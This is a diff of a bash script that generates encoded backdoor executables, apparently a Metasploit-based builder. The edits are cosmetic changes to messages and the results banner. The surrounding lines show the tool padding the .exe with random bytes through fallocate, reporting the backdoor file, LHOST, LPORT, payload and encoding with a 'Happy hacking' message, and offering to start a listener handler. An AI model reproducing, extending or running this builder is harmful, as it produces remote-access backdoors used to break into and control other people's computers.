@@ -18,7 +18,7 @@ cat << !
 sleep 2
 # Check root
 if [ "$(id -u)" != "0" ] > /dev/null 2>&1; then
-echo -e '\e[0;31m【!!】 This 02Zcat root permission\e[0m' 1>&2
+echo -e '\e[0;31m【!!】 02Zcat root \e[0m' 1>&2
 exit
 fi
 dir=`pwd`
@@ -133,10 +133,6 @@ if [ "$fail" == "1" ]; then
 echo ""
 sleep 2
 echo -e '\e[0;31mScript require dependencies\e[0m'
-echo -e '\e[0;31mMore information:\e[0m'  
-echo -e '\e[0;31mhttps://www.metasploit.com/\e[0m'
-echo -e '\e[0;31mhttp://www.mono-project.com/\e[0m'
-echo -e '\e[0;31mhttps://www.postgresql.org/\e[0m' 
 sleep 2
 echo ""
 echo -e '\e[0;31m***********ERROR***********\e[0m'
@@ -344,23 +340,23 @@ luzeera=`echo $(($tamainua + $RANDOM%2000))`
 fallocate -o $offset -l $luzeera $dir/output/$izena.exe
 
 sleep 1
-echo "============================================================================"
-echo "="
-echo "="
-echo -e '\e[0;31mCONGRATULATIONS  Back Door generated Happy hacking.....!!\e[0m'
-echo ""
-echo "=    BACKDOOR FILE= $dir/output/$izena.exe"
-echo "=    BACKDOOR SIZE= `stat -c %s $dir/output/$izena.exe` Bytes"
-echo "=    LHOST=$ip"
-echo "=    LPORT=$port"         
-echo "=    ENCODED BACKDOOR=$encoded" 
-echo "=    PAYLOAD=${payload^^}"	       
-echo "=    NUMBER OF ITERATIONS=$int"
-echo "=    ICON=${icon^^}"
-echo "=    MESSAGE=${error^^}"
-echo "="
-echo "="
-echo "============================================================================"
+echo "===========================================================================>"
+echo "=>"
+echo "=>"
+echo -e '=>    \e[0;31mCONGRATULATIONS  Back Door generated Happy hacking.....!!\e[0m'
+echo "=>"
+echo "=>    BACKDOOR FILE= $dir/output/$izena.exe"
+echo "=>    BACKDOOR SIZE= `stat -c %s $dir/output/$izena.exe` Bytes"
+echo "=>    LHOST=$ip"
+echo "=>    LPORT=$port"         
+echo "=>    ENCODED =$encoded" 
+echo "=>    PAYLOAD=${payload^^}"	       
+echo "=>    NUMBER OF ITERATIONS=$int"
+echo "=>    ICON=${icon^^}"
+echo "=>    MESSAGE=${error^^}"
+echo "=>"
+echo "=>"
+echo "===========================================================================>"
 sleep 2
 echo -e "\e[0;31mStart handler? y or n\e[0m => \c"
 read handler
